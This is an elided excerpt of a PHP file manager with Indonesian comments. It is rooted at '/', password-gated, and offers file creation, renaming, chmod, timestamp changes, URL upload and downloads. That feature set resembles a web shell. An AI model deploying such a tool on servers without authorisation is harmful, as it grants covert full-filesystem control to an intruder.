...
// ================== CONFIG ==================
// ROOT UNIVERSAL – sangat powerful, JANGAN taruh di server publik tanpa proteksi tambahan
$CONFIG_ROOT   = '/';
$PASSWORD_HASH = '$2a$12$g/eTGMWekyt8BZ0H47nak.imw5xQ8eMWmv5.EMGUSZS/ZYd01crKi'; // ganti hash bcrypt kamu
$SESSION_KEY   = 'fm_auth';
// ============================================
            ...
            if ($isFile) {
                if (file_exists($dest)) {
                    ...
                    if (file_put_contents($dest, $content) === false) {
                        $messages[] = "[FAIL] Gagal buat file: $dest";
                    } else {
...
function toggleBox(id){
  const all=['box_new_file','box_new_folder','box_rename','box_chmod','box_time','box_url_upload'];
  all.forEach(x=>{
...
<form method="post" enctype="multipart/form-data" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
  ...
  <div class="box">
    ...
    <button type="submit" name="action" value="download_selected">
      ...
      if ($items === false) {
          ...
          foreach ($items as $it) {
              ...
              if (is_dir($full)) {
                  ...
                  echo '<td><input type="text" name="rename_val['.$safe.']" value="'.$safe.'"></td>';
                  echo '<td>
                          <button type="submit" class="btn-danger"
                                  name="action"
